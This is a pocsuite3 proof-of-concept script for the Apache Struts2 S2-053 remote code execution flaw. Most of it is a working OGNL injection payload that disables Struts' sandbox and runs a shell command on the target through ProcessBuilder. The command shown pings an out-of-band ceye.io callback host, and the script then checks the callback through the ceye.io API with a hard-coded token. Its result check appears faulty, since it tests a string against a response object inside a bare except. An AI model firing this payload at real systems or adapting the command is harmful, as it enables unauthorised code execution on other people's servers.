#!/usr/bin/env python
# _*_ encoding：utf-8 _*_

from pocsuite3.api import POCBase
from pocsuite3.api import register_poc
from pocsuite3.api import Output
from collections import OrderedDict
from pocsuite3.api import OptString
from pocsuite3.api import requests
from pocsuite3.lib.utils import random_str

class Struts2(POCBase):
    vulID = ''
    version = '1.0'
    author = ['big04dream']
    vulDate = '2018-08-24'
    createDate = '2020-07-01'
    updateDate = '2020-07-01'
    references = ['']
    name = 'Apache Struts2 远程代码执行漏洞 (S2-053/CVE-2017-12611)'
    appPowerLink = 'https://struts.apache.org/'
    appName = 'Struts2'
    appVersion = 'Struts 2.0.1 - Struts 2.3.33, Struts 2.5 - Struts 2.5.10'
    vulType = 'rce'
    desc = '''
    Apache Struts2 远程代码执行漏洞 (S2-053/CVE-2017-12611)
    '''

    def _verify(self):
        result = {}
        try:
            cmd = random_str(16) + '.6eb4yw.ceye.io'
            cmd2 = 'ping ' + cmd
            params = {
                "redirectUri": "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + cmd2 + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}" + "\n"
            }
            r = requests.post(self.url, params=params, headers=self._headers)
            if r.status_code == 200:
                res = requests.get('http://api.ceye.io/v1/records?token=2490ae17e5a04f03def427a596438995&type=dns')
                if cmd in res:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = self.url
                    result['VerifyInfo']['Payload'] = params
        except:
            pass
        return self.parse_output(result)

    @property
    def _headers(self):
        headers = {
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Referer': self.url,
            'Connection':'close',
            'Cookie':'JSESSIONID=E25862AE388D006049EA9D3CEF12F246',
            'Upgrade-Insecure-Requests':'1',
            'Cache-Control':'max-age=0'
        }
        return headers

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerability')
        return output

register_poc(Struts2)